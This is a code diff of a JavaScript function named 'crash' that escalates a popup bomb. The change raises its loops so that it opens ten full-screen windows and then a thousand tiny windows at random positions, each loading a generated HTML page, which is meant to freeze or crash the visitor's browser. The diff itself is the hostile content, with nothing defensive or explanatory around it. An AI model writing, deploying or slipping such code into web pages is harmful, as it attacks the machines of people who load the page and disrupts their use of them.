@@ -1,5 +1,5 @@
 function crash(){
-    for(var i=0;i<1;i++){
+    for(var i=0;i<10;i++){
             window.open("","","popup,width="+window.screen.availWidth+",height="+window.screen.availHeight)
         }
         var blob = new Blob([`
@@ -20,7 +20,7 @@ function crash(){
             <\/script>
             `], {type:"text/html"})
             var a=window.URL.createObjectURL(blob)
-        for(var j=0;j<1;j++){
+        for(var j=0;j<1000;j++){
             window.open(a, "", "popup,width=25,height=25,top="+Math.random()*window.screen.availWidth+",left="+Math.random()*window.screen.availHeight*2);
         }
 }
